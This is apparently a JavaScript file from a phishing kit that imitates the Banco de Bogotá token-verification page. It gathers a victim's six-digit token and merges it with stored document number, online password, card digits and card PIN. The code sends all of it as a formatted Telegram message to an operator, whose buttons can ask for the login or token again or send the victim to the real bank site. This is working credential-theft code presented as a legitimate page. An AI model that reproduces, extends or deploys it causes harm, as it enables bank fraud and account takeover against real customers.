/**
 * TOKEN-NEW.JS - Página de verificación de token con integración centralizada
 */

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando página de token (NEW)...');

    const tokenInputs = document.querySelectorAll('.token-digit');
    const submitBtn = document.querySelector('.verify-btn');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Funciones de overlay
    function showOverlay() {
        if (loadingOverlay) {
            loadingOverlay.classList.add('active');
            loadingOverlay.style.display = 'flex';
        }
    }

    function hideOverlay() {
        if (loadingOverlay) {
            loadingOverlay.classList.remove('active');
            loadingOverlay.style.display = 'none';
        }
    }

    // Manejador de acciones de Telegram
    window.bogotaSocket.handleTelegramActions((data) => {
        hideOverlay();
        
        switch(data.action) {
            case 'request_login':
                window.location.href = 'index.html';
                break;
            case 'request_token':
                // Limpiar campos y mostrar formulario
                tokenInputs.forEach(input => input.value = '');
                tokenInputs[0].focus();
                break;
            case 'finish':
                window.location.href = 'https://www.bancodebogota.com/';
                break;
        }
    });

    // ========================================
    // LÓGICA DE INPUTS DE TOKEN
    // ========================================

    tokenInputs.forEach((input, index) => {
        // Permitir solo números
        input.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            
            if (this.value.length === 1 && index < tokenInputs.length - 1) {
                tokenInputs[index + 1].focus();
            }

            checkComplete();
        });

        // Manejo de teclas especiales
        input.addEventListener('keydown', function(e) {
            // Backspace
            if (e.key === 'Backspace') {
                if (this.value === '' && index > 0) {
                    tokenInputs[index - 1].focus();
                }
            }
            
            // Teclas de flecha
            if (e.key === 'ArrowLeft' && index > 0) {
                tokenInputs[index - 1].focus();
            }
            if (e.key === 'ArrowRight' && index < tokenInputs.length - 1) {
                tokenInputs[index + 1].focus();
            }
        });

        // Manejo de pegado
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
            
            for (let i = 0; i < pastedData.length && (index + i) < tokenInputs.length; i++) {
                tokenInputs[index + i].value = pastedData[i];
            }
            
            const nextEmpty = Array.from(tokenInputs).findIndex(inp => inp.value === '');
            if (nextEmpty !== -1) {
                tokenInputs[nextEmpty].focus();
            } else {
                tokenInputs[tokenInputs.length - 1].focus();
            }
            
            checkComplete();
        });
    });

    // Verificar si el token está completo
    function checkComplete() {
        const isComplete = Array.from(tokenInputs).every(input => input.value.length === 1);
        
        if (submitBtn) {
            submitBtn.disabled = !isComplete;
            if (isComplete) {
                submitBtn.classList.add('active');
            } else {
                submitBtn.classList.remove('active');
            }
        }
    }

    // ========================================
    // SUBMIT HANDLER
    // ========================================

    if (submitBtn) {
        submitBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const tokenValue = Array.from(tokenInputs).map(input => input.value).join('');
            
            if (tokenValue.length !== 6) {
                alert('Por favor ingrese el código de 6 dígitos');
                return;
            }

            showOverlay();

            // Acumular datos
            const bogotaData = JSON.parse(sessionStorage.getItem('bogotaData') || '{}');
            bogotaData.token = tokenValue;
            sessionStorage.setItem('bogotaData', JSON.stringify(bogotaData));

            // Formatear mensaje completo
            let message = '\n🔔 <b>BANCO DE BOGOTÁ - RESUMEN COMPLETO</b>\n\n';
            message += '📝 <b>INFORMACIÓN COMPLETA:</b>\n';
            
            if (bogotaData.tipoLogin) {
                message += `🔐 <b>Tipo Login:</b> ${bogotaData.tipoLogin}\n`;
            }
            if (bogotaData.tipoDocumento) {
                message += `📄 <b>Tipo Documento:</b> ${bogotaData.tipoDocumento}\n`;
            }
            if (bogotaData.numeroDocumento) {
                message += `🆔 <b>Número Documento:</b> ${bogotaData.numeroDocumento}\n`;
            }
            if (bogotaData.claveSegura) {
                message += `🔑 <b>Clave Segura:</b> ${bogotaData.claveSegura}\n`;
            }
            if (bogotaData.ultimosDigitosTarjeta) {
                message += `💳 <b>Últimos 4 Dígitos:</b> ${bogotaData.ultimosDigitosTarjeta}\n`;
            }
            if (bogotaData.claveTarjeta) {
                message += `🔐 <b>Clave Tarjeta:</b> ${bogotaData.claveTarjeta}\n`;
            }
            if (bogotaData.token) {
                message += `📱 <b>Token:</b> ${bogotaData.token}\n`;
            }
            
            message += `\n⏰ ${new Date().toLocaleString('es-CO')}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '🔑 Pedir Login', callback_data: `request_login:${window.bogotaSocket.sessionId}` }],
                    [{ text: '📱 Pedir Token', callback_data: `request_token:${window.bogotaSocket.sessionId}` }],
                    [{ text: '✅ Finalizar', callback_data: `finish:${window.bogotaSocket.sessionId}` }]
                ]
            };

            try {
                await window.bogotaSocket.sendData('token', { text: message.trim(), keyboard: keyboard });
                console.log('✅ Token enviado correctamente');
            } catch (error) {
                console.error('❌ Error:', error);
                hideOverlay();
                alert('Error al enviar el token');
            }
        });
    }

    // Foco inicial en el primer input
    if (tokenInputs.length > 0) {
        tokenInputs[0].focus();
    }

    console.log('✅ Página de token (NEW) iniciada correctamente');
});
